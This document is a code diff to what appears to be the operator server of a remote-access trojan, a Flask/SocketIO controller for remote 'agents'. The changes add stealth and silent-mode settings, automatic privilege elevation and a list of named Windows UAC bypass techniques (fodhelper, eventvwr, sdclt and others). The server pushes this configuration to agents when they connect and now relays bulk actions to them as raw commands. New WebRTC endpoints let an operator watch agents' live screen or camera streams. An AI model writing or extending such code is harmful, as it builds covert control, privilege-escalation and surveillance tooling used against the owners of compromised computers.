@@ -243,7 +243,30 @@ DEFAULT_SETTINGS = {
         'silentMode': True,
         'quickStartup': False,
         'enableStealth': True,
-        'autoElevatePrivileges': True
+        'autoElevatePrivileges': True,
+        'requestAdminFirst': False,
+        'maxPromptAttempts': 3,
+        'uacBypassDebug': True,
+        'persistentAdminPrompt': False
+    },
+    'bypasses': {
+        'enabled': True,
+        'methods': {
+            'cleanmgr_sagerun': True,
+            'fodhelper': True,
+            'computerdefaults': True,
+            'eventvwr': True,
+            'sdclt': True,
+            'wsreset': True,
+            'slui': True,
+            'winsat': True,
+            'silentcleanup': True,
+            'icmluautil': True
+        }
+    },
+    'registry': {
+        'enabled': True,
+        'notificationsEnabled': True
     },
     'webrtc': {
         'enabled': True,
@@ -3636,9 +3659,10 @@ def execute_bulk_action():
         if agent_id in AGENTS_DATA:
             agent_sid = AGENTS_DATA[agent_id].get('sid')
             if agent_sid:
-                # Emit action to agent
-                socketio.emit('bulk_action', {
-                    'action': action
+                # Emit action as a command for agent-side handling
+                socketio.emit('command', {
+                    'command': str(action),
+                    'execution_id': f"bulk_{int(time.time())}_{secrets.token_hex(4)}"
                 }, room=agent_sid)
                 
                 results.append({
@@ -4077,7 +4101,19 @@ def handle_join_room(room_name):
         print(f"Agent list sent to operator {request.sid}")
 
 def _emit_agent_config(agent_id: str):
-    return
+    try:
+        agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
+        if not agent_sid:
+            return
+        s = load_settings()
+        payload = {
+            'agent': s.get('agent', {}),
+            'bypasses': s.get('bypasses', {}),
+            'registry': s.get('registry', {})
+        }
+        emit('config_update', payload, room=agent_sid)
+    except Exception:
+        pass
 
 @socketio.on('request_agent_list')
 def handle_request_agent_list():
@@ -4139,6 +4175,10 @@ def handle_agent_connect(data):
         }, room='operators', broadcast=True)
         print(f"Agent {agent_id} connected with SID {request.sid}")
         print(f"🔍 Controller: Agent registration successful. AGENTS_DATA now contains: {list(AGENTS_DATA.keys())}")
+        try:
+            _emit_agent_config(agent_id)
+        except Exception:
+            pass
         try:
             email_cfg = load_settings().get('email', {})
             if email_cfg.get('enabled') and email_cfg.get('notifyAgentOnline'):
@@ -4293,6 +4333,10 @@ def handle_agent_register(data):
         # Notify operators
         print(f"Broadcasting agent_list_update to operators room with agent data: {list(AGENTS_DATA.keys())}")
         emit('agent_list_update', AGENTS_DATA, room='operators', broadcast=True)
+        try:
+            _emit_agent_config(agent_id)
+        except Exception:
+            pass
         
         # Log activity for operators
         emit('activity_update', {
@@ -5312,6 +5356,143 @@ def handle_webrtc_implement_frame_dropping(data):
         emit('webrtc_frame_dropping_result', {'error': str(e)}, room=request.sid)
 
 # WebRTC scaffolding code removed - not currently active
+
+@app.route('/api/webrtc/config', methods=['GET'])
+def http_webrtc_config():
+    try:
+        return jsonify({
+            'enabled': WEBRTC_CONFIG.get('enabled', False),
+            'iceServers': WEBRTC_CONFIG.get('ice_servers', []),
+            'codecs': WEBRTC_CONFIG.get('codecs', {}),
+        })
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+def _get_viewer_token():
+    try:
+        token = session.get('webrtc_viewer_id')
+    except Exception:
+        token = None
+    if not token:
+        token = secrets.token_hex(16)
+        session['webrtc_viewer_id'] = token
+    return token
+
+@app.route('/api/webrtc/viewer/connect', methods=['POST'])
+def http_webrtc_viewer_connect():
+    if not WEBRTC_AVAILABLE:
+        return jsonify({'success': False, 'error': 'WebRTC not available'}), 400
+    data = request.get_json(silent=True) or {}
+    agent_id = data.get('agent_id')
+    if not agent_id or agent_id not in WEBRTC_STREAMS:
+        return jsonify({'success': False, 'error': 'Agent not available for WebRTC'}), 400
+    try:
+        viewer_token = _get_viewer_token()
+        viewer_pc = RTCPeerConnection()
+        for ice_server in WEBRTC_CONFIG['ice_servers']:
+            viewer_pc.addIceServer(ice_server)
+        WEBRTC_VIEWERS[viewer_token] = {
+            'agent_id': agent_id,
+            'pc': viewer_pc,
+            'streams': {}
+        }
+        agent_streams = WEBRTC_STREAMS.get(agent_id, {})
+        for track_kind, tracks in agent_streams.items():
+            try:
+                if isinstance(tracks, list):
+                    for t in tracks:
+                        sender = viewer_pc.addTrack(t)
+                        if track_kind not in WEBRTC_VIEWERS[viewer_token]['streams']:
+                            WEBRTC_VIEWERS[viewer_token]['streams'][track_kind] = []
+                        WEBRTC_VIEWERS[viewer_token]['streams'][track_kind].append(sender)
+                else:
+                    sender = viewer_pc.addTrack(tracks)
+                    WEBRTC_VIEWERS[viewer_token]['streams'][track_kind] = [sender]
+            except Exception:
+                pass
+        try:
+            loop = asyncio.get_event_loop()
+            future = asyncio.run_coroutine_threadsafe(viewer_pc.createOffer(), loop)
+            offer = future.result(timeout=5)
+            try:
+                asyncio.run_coroutine_threadsafe(viewer_pc.setLocalDescription(offer), loop)
+            except RuntimeError:
+                async def set_local_desc():
+                    await viewer_pc.setLocalDescription(offer)
+                asyncio.run(set_local_desc())
+            return jsonify({'success': True, 'offer': offer.sdp, 'type': offer.type})
+        except RuntimeError:
+            async def create_offer_async():
+                offer = await viewer_pc.createOffer()
+                await viewer_pc.setLocalDescription(offer)
+                return offer
+            offer = asyncio.run(create_offer_async())
+            return jsonify({'success': True, 'offer': offer.sdp, 'type': offer.type})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/webrtc/viewer/answer', methods=['POST'])
+def http_webrtc_viewer_answer():
+    data = request.get_json(silent=True) or {}
+    answer_sdp = data.get('answer')
+    token = session.get('webrtc_viewer_id')
+    if not answer_sdp or not token or token not in WEBRTC_VIEWERS:
+        return jsonify({'success': False, 'error': 'Invalid viewer session'}), 400
+    try:
+        viewer_pc = WEBRTC_VIEWERS[token]['pc']
+        answer = RTCSessionDescription(sdp=answer_sdp, type='answer')
+        try:
+            loop = asyncio.get_event_loop()
+            asyncio.run_coroutine_threadsafe(viewer_pc.setRemoteDescription(answer), loop)
+        except RuntimeError:
+            async def set_remote_desc():
+                await viewer_pc.setRemoteDescription(answer)
+            asyncio.run(set_remote_desc())
+        return jsonify({'success': True})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/webrtc/viewer/ice', methods=['POST'])
+def http_webrtc_viewer_ice():
+    data = request.get_json(silent=True) or {}
+    candidate = data.get('candidate')
+    token = session.get('webrtc_viewer_id')
+    if not candidate or not token or token not in WEBRTC_VIEWERS:
+        return jsonify({'success': False, 'error': 'Invalid viewer session'}), 400
+    try:
+        viewer_pc = WEBRTC_VIEWERS[token]['pc']
+        try:
+            loop = asyncio.get_event_loop()
+            asyncio.run_coroutine_threadsafe(viewer_pc.addIceCandidate(candidate), loop)
+        except RuntimeError:
+            async def add_ice():
+                await viewer_pc.addIceCandidate(candidate)
+            asyncio.run(add_ice())
+        return jsonify({'success': True})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/webrtc/viewer/disconnect', methods=['POST'])
+def http_webrtc_viewer_disconnect():
+    token = session.get('webrtc_viewer_id')
+    if not token or token not in WEBRTC_VIEWERS:
+        return jsonify({'success': True})
+    try:
+        viewer_pc = WEBRTC_VIEWERS[token]['pc']
+        try:
+            loop = asyncio.get_event_loop()
+            asyncio.run_coroutine_threadsafe(viewer_pc.close(), loop)
+        except RuntimeError:
+            async def close_viewer():
+                await viewer_pc.close()
+            asyncio.run(close_viewer())
+    except Exception:
+        pass
+    try:
+        del WEBRTC_VIEWERS[token]
+    except Exception:
+        pass
+    return jsonify({'success': True})
 
 # Additional WebSocket events for real-time updates
 
